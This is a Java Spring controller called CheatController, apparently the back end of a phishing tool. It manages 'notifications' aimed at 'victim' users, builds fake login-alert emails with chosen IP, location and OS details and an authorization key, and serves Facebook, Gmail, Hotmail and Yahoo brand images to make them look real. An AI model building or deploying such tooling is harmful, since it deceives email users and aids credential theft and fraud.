package com.example.springwebtemplate.controller;

import java.io.UnsupportedEncodingException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
import org.hibernate.criterion.Criterion;
import org.hibernate.criterion.Order;
import org.hibernate.criterion.Restrictions;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSource;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.validation.BeanPropertyBindingResult;
import org.springframework.validation.BindingResult;
import org.springframework.validation.FieldError;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import com.example.springwebtemplate.controller.response.BaseRestResponse;
import com.example.springwebtemplate.controller.response.EnumTypeModel;
import com.example.springwebtemplate.controller.response.ImageModel;
import com.example.springwebtemplate.controller.response.NotificationDto;
import com.example.springwebtemplate.controller.response.PageModel;
import com.example.springwebtemplate.controller.response.StatusModel;
import com.example.springwebtemplate.controller.response.ValidationModel;
import com.example.springwebtemplate.controller.validator.NotificationValidator;
import com.example.springwebtemplate.dbo.NotificationDbo;
import com.example.springwebtemplate.dbo.NotificationUserDbo;
import com.example.springwebtemplate.dbo.enums.AuthenticationTypeEnum;
import com.example.springwebtemplate.dbo.enums.NotificationStateEnum;
import com.example.springwebtemplate.dbo.enums.NotificationTypeEnum;
import com.example.springwebtemplate.dbo.enums.OperatingSystemTypeEnum;
import com.example.springwebtemplate.service.MailService;
import com.example.springwebtemplate.service.NotificationService;
import com.example.springwebtemplate.service.NotificationUserService;
import com.example.springwebtemplate.util.ConstantKeys;
import com.example.springwebtemplate.util.RandomGUID;
import com.example.springwebtemplate.util.SpringPropertiesUtil;
import com.example.springwebtemplate.util.StreamUtil;

@Controller
@RequestMapping("/cheat")
public class CheatController {

	private static final Logger logger = LoggerFactory
			.getLogger(CheatController.class);
	
	@Autowired
	private MessageSource messageSource;
		
	@Autowired
	NotificationUserService notificationUserService;
	
	@Autowired
	NotificationService notificationService;
	
	@Autowired
	private MailService mailService;
	
	@Autowired
	private VictimController victimController;
	
	@Autowired
	private TypeController typeController;
	
	@RequestMapping(value = "/default", method = RequestMethod.GET)
	public String victims(ModelMap model){
		model.addAttribute("contextPath", SpringPropertiesUtil.getProperty("contextPath"));
		model.addAttribute("notificationDto",new NotificationDto());
		model.addAttribute("notificationUserId", -1);
		model.addAttribute("notificationOs", -1);
		model.addAttribute("notificationAction", -1);
		model.addAttribute("notificationType", -1);
		model.addAttribute("notificationOsValues",OperatingSystemTypeEnum.values());
		model.addAttribute("notificationActionValues",AuthenticationTypeEnum.values());
		model.addAttribute("notificationTypeValues", NotificationTypeEnum.values());
		model.addAttribute("notificationUsers", this.notificationUserService.getAllNotificationUsers());
		return "responsiveviews/notifications";
	}
		
	@RequestMapping(value = "/new", method = RequestMethod.POST, produces = "application/json")
	@ResponseBody
	public BaseRestResponse newNotification(NotificationDto notificationDto, Locale locale) throws UnsupportedEncodingException{
		ValidationModel response = new ValidationModel();
		NotificationValidator validator = new NotificationValidator();
		validator.setNotificationUserService(this.notificationUserService);
		BindingResult result = new BeanPropertyBindingResult(notificationDto, "notificationDto");
		
		// set automatic filled fields
		notificationDto.setNotificationAction(AuthenticationTypeEnum.LOG_IN.getValue());
		Date currentDate = new Date();
		DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US);
		dateFormat.setTimeZone(TimeZone.getTimeZone("Europe/Istanbul"));
		notificationDto.setNotificationDate(dateFormat.format(currentDate));
		NotificationUserDbo user = this.notificationUserService.findNotificationUserById(notificationDto.getNotificationUser());
		if(user != null){
			notificationDto.setNotificationType(user.getNotificationTypeFromEmail().getValue());
		}
		
		validator.validate(notificationDto, result);
		
        if (result.hasErrors()){
        	response.setStatus(false);
        	for (FieldError error : result.getFieldErrors()) {
        		response.getErrors().put(error.getField(), messageSource.getMessage(error.getCode(), null, locale));
            }
        	return response;
        }

        
        NotificationDbo notification = new NotificationDbo(notificationDto);
        notification.setNotificationUser(user);
        notification.setEmailto(user.getEmail());
        notification.setNotificationAuthorizationId(RandomGUID.getInstance().generateRandomKey());
        notification.prepareNotificationEmailContent();
        
        this.notificationService.saveNotification(notification);
        response.setStatus(true);
        return response;
	}
	
	@RequestMapping(value = "/update", method = RequestMethod.POST, produces = "application/json")
	@ResponseBody
	public BaseRestResponse updateNotification(NotificationDto notificationDto, Locale locale) throws UnsupportedEncodingException{
		ValidationModel response = new ValidationModel();
		
		NotificationDbo notification = this.notificationService.findNotificationById(notificationDto.getNotificationId());
		
		if(notification == null){
			response.setStatus(false);
			return response;
		}
		else if(notification != null && (notification.getNotificationState() == NotificationStateEnum.SUCCESS || 
										 notification.getNotificationState() == NotificationStateEnum.FAIL ||
										 notification.getNotificationState() == NotificationStateEnum.ACTIVE)){
			response.setStatus(false);
			response.getErrors().put("notificationState", messageSource.getMessage("errorUpdateNotification", null, locale));
			return response;
		}
		
		NotificationValidator validator = new NotificationValidator();
		validator.setNotificationUserService(this.notificationUserService);
		BindingResult result = new BeanPropertyBindingResult(notificationDto, "notificationDto");
		
		// set automatic filled fields
		notificationDto.setNotificationUser((int) notification.getNotificationUser().getNotificationUserId());
		notificationDto.setNotificationAction(AuthenticationTypeEnum.LOG_IN.getValue());
		notificationDto.setNotificationType(notification.getNotificationType().getValue());
		
		validator.validate(notificationDto, result);
		
        if (result.hasErrors()){
        	response.setStatus(false);
        	for (FieldError error : result.getFieldErrors()) {
        		response.getErrors().put(error.getField(), messageSource.getMessage(error.getCode(), null, locale));
            }
        	return response;
        }
        
        notification.setNotificationDate(notificationDto.getDate());
        notification.setNotificationLocation(notificationDto.getNotificationLocation());
        notification.setNotificationOs(OperatingSystemTypeEnum.getValue(notificationDto.getNotificationOs()));
        notification.setNotificationIp(notificationDto.getNotificationIp());
        notification.prepareNotificationEmailContent();
        this.notificationService.saveNotification(notification);
        response.setStatus(true);
        return response;
	}
	
	@RequestMapping(value = "/delete", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse deleteNotification(@RequestParam(value = "nid", defaultValue = "0") String notificationId){
		StatusModel response = new StatusModel();
		try{
			NotificationDbo notification = this.notificationService.findNotificationById(Long.parseLong(notificationId));
			if(notification != null){
				// notification state should be changed from anything to passive! 
				notification.setNotificationState(NotificationStateEnum.PASSIVE);
				this.notificationService.saveNotification(notification);
				
				List<NotificationDbo> notifications = new ArrayList<NotificationDbo>();
				notifications.add(notification);
				this.notificationService.deleteNotifications(notifications);	
			}
			response.setReason("Notifikasyon silindi");
			response.setStatus(true);
			return response;
		}
		catch(Exception e){
			e.printStackTrace();
			response.setReason(e.getLocalizedMessage());
		}
		response.setStatus(false);
		return response;
	}
	
	@RequestMapping(value = "/get", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse getNotifications(@RequestParam(value = "uid", defaultValue = "0") String userId,
											 @RequestParam(value = "pn", defaultValue = "1") String pageNumber) {
		PageModel<NotificationDto> response = new PageModel<NotificationDto>();
		try {
			Criterion criterion = null;
			if(userId.compareTo("0") != 0){
				criterion = Restrictions.eq("notificationUser.notificationUserId", Long.valueOf(userId));
			}
			
			int totalPageNumber = this.notificationService.getPageNumber(criterion);
			List<NotificationDbo> allNotifications = this.notificationService.getPageResult(criterion, Order.desc("storeDate"), Integer.parseInt(pageNumber));
			response.setPage(Integer.parseInt(pageNumber));
			response.setTotalPage(totalPageNumber);
			if(allNotifications != null){
				for (NotificationDbo notification : allNotifications) {
					NotificationDto notificationDto = new NotificationDto(notification);
					response.getPageResult().add(notificationDto);
				}
			}
			return response;
		} catch (Exception ex) {
			ex.printStackTrace();
			logger.error("Error occured: " + ex.getLocalizedMessage());
			return response;
		}
	}
					
	@RequestMapping(value = "/image/get", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse getUserImage(@RequestParam(value = "uid", defaultValue = "0") String userId){
		return this.victimController.getUserImage(userId);
	}
	
	@RequestMapping(value = "/image/type/get", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse getNotificationTypeImage(@RequestParam(value = "tid", defaultValue = "0") String typeId){
		ImageModel model = new ImageModel();
		try{
			model.setUserId(Integer.parseInt(typeId));
			switch(NotificationTypeEnum.getValue(Integer.parseInt(typeId))){
				case FACEBOOK:
					model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.facebook))));
					break;
				case GMAIL: 
					model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.gmail))));
					break;
				case HOTMAIL:
					model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.hotmail))));
					break;
				case YAHOO:
					model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.yahoo))));
					break;
				default:
					model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.defaultMail))));
					break;
			}
		}
		catch(Exception e){
			e.printStackTrace();
		}
		return model;
	}
	
	@RequestMapping(value = "/image/state/get", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse getStateImage(@RequestParam(value = "sid", defaultValue = "0") String stateId){
		ImageModel model = new ImageModel();
		try{
			switch (NotificationStateEnum.getValue(Integer.parseInt(stateId))) {
			case IDLE:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_idle))));
				break;
			case ACTIVE:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_active))));				
				break;
			case PASSIVE:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_passive))));
				break;
			case FAIL:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_fail))));
				break;
			case SUCCESS:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_success))));
				break;
			default:
				model.setUserId(Integer.parseInt(stateId));
				model.setNotificationUserimageBase64(Base64.encodeBase64String(IOUtils.toByteArray(StreamUtil.getStream(ConstantKeys.notification_idle))));
				break;
			}
		}
		catch(Exception e){
			e.printStackTrace();
		}
		return model;
	}
	
	@RequestMapping(value = "/state/get", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public ArrayList<EnumTypeModel> getStates(){
		ArrayList<EnumTypeModel> states = null;
		try{
			return this.typeController.getNotificationStates();
		}
		catch(Exception e){
			e.printStackTrace();
		}
		return states;
	}
	
	@RequestMapping(value = "/state/change", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse changeNotificationState(@RequestParam(value = "nid", defaultValue = "0") String notificationId,
															@RequestParam(value = "sid", defaultValue = "0") String stateId){
		StatusModel response = new StatusModel();
		try{
			NotificationDbo notification = this.notificationService.findNotificationById(Integer.parseInt(notificationId));
			if(notification != null){
				notification.setNotificationState(NotificationStateEnum.getValue(Integer.parseInt(stateId)));
				this.notificationService.saveNotification(notification);
				response.setStatus(true);
				response.setReason("Notifikasyon durumu guncellendi.");
			}
		}
		catch(Exception e){
			e.printStackTrace();
			response.setReason(e.getLocalizedMessage());
		}
		return response;
	}
	
	@RequestMapping(value = "/count", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public int getNotificationCount() {
		int count = 0;
		try {
			count = this.notificationService.getRowCount(null);
		} catch (Exception ex) {
			ex.printStackTrace();
			logger.error("Error occured: " + ex.getLocalizedMessage());
		}
		return count;
	}
					
	@RequestMapping(value = "/search", method = RequestMethod.GET, produces = "application/json")
	@ResponseBody
	public BaseRestResponse searchNotifications(@RequestParam(value = "text", defaultValue = "") String searchText,
			@RequestParam(value = "pn", defaultValue = "1") String pageNumber) {
		PageModel<NotificationDto> response = new PageModel<NotificationDto>();
		try {
			List<NotificationDbo> results = this.notificationService.searchNotifications(searchText, Integer.parseInt(pageNumber));
			if(results != null){
				logger.info("[ " + results.size() + " ] item is found for keyword: " + searchText + " Page: " + pageNumber);
				response.setPage(Integer.parseInt(pageNumber));
				response.setTotalPage(0);
				for (NotificationDbo user : results) {
					NotificationDto notuser = new NotificationDto(user);
					response.getPageResult().add(notuser);
				}
			}
			else{
				logger.info("[ 0 ] item is found for keyword: " + searchText + " Page: " + pageNumber);
			}
			return response;
		} catch (Exception ex) {
			ex.printStackTrace();
			logger.error("Error occured: " + ex.getLocalizedMessage());
			return response;
		}
	}
}
